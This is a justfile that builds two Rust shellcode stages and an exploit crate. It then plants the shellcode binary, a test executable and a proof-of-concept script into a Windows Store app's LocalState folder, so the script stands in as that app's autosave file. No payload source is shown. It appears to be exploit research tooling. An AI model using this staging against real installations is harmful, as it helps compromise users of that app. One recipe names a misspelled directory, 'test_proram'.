set shell := ["cmd.exe", "/c"]

build-stage1:
    cd ./shellcode_stage1 && cargo build --release

build-stage2:
    cd ./shellcode_stage2 && cargo build --release

build-test-program:
    cd ./test_proram && cargo build --release

build-exploit:
    just --justfile {{justfile()}} build-stage1
    just --justfile {{justfile()}} build-stage2
    cargo run --release

generate:
    just --justfile {{justfile()}} build-exploit
    cp shellcode_stage2\\target\\x86_64-pc-windows-msvc\\release\\shellcode_stage2.bin %LOCALAPPDATA%\Packages\27878ConstantineTarasenko.458004FD2C47C_c8b3w9r5va522\LocalState\stage2.bin
    cp test_program\\target\\release\\test_program.exe %LOCALAPPDATA%\Packages\27878ConstantineTarasenko.458004FD2C47C_c8b3w9r5va522\LocalState
    cp outputs\gamescript_poc.txt %LOCALAPPDATA%\Packages\27878ConstantineTarasenko.458004FD2C47C_c8b3w9r5va522\LocalState\gamescript_autosave.txt
